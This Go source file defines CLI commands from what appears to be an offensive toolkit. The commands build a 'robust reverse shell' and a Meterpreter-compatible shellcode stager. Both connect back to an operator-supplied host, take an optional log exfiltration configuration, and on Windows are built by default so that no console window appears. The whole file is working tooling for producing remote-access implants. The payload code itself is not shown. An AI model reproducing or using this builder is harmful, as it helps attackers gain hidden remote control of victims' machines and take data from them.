package cmd

import (
	"fmt"
	"runtime"

	"github.com/spf13/cobra"
)

var payloadCmd = &cobra.Command{
	Use:           "payload",
	Short:         "build a payload",
	SilenceErrors: true,
}

var reverseShellCmd = &cobra.Command{
	Use:   "rsh",
	Short: "robust reverse shell",
	Run: func(cmd *cobra.Command, args []string) {
		regular := regularLDFlags{"w": "", "s": ""}
		if opts.os == "windows" && !opts.noWindowsGui {
			regular["H"] = "windowsgui"
		}
		externalVars := externalVarLDFlags{
			"address":  opts.address,
			"network":  opts.net,
			"exfilCfg": opts.exfilCfg,
		}

		err := build([]string{
			"-ldflags", setupLDFlags(regular, externalVars),
			"-o", outputFileName("reverse_shell"),
			"./payloads/reverse_shell",
		})
		if err != nil {
			fmt.Println(err)
		}
	},
}

var stagerCmd = &cobra.Command{
	Use:   "stager",
	Short: "meterpreter/reverse_tcp compatible shellcode stager",
	Run: func(cmd *cobra.Command, args []string) {
		regular := regularLDFlags{"w": "", "s": ""}
		if opts.os == "windows" && !opts.noWindowsGui {
			regular["H"] = "windowsgui"
		}
		externalVars := externalVarLDFlags{
			"address":  opts.address,
			"network":  opts.net,
			"exfilCfg": opts.exfilCfg,
		}

		err := build([]string{
			"-ldflags", setupLDFlags(regular, externalVars),
			"-o", outputFileName("stager"),
			"./payloads/stager",
		})
		if err != nil {
			fmt.Println(err)
		}
	},
}

func init() {
	payloadCmd.PersistentFlags().StringVarP(&opts.address, "destination", "d", "",
		"connect-back destination, like LHOST (host:port)")
	payloadCmd.PersistentFlags().StringVarP(&opts.net, "network", "n", "tcp", "dial network")
	payloadCmd.PersistentFlags().StringVar(&opts.arch, "arch", runtime.GOARCH, "target architecture")
	payloadCmd.PersistentFlags().StringVar(&opts.os, "os", runtime.GOOS, "target operating system")
	payloadCmd.PersistentFlags().StringVarP(&opts.output, "output", "o", "", "target operating system")
	payloadCmd.PersistentFlags().StringVarP(&opts.exfilCfg, "exfil", "e", "", "log exfil configuration")
	payloadCmd.PersistentFlags().BoolVar(&opts.noWindowsGui, "nowindowsgui", false, "don't use -H=windowsgui")

	_ = payloadCmd.MarkPersistentFlagRequired("destination")

	payloadCmd.AddCommand(reverseShellCmd)
	payloadCmd.AddCommand(stagerCmd)
}
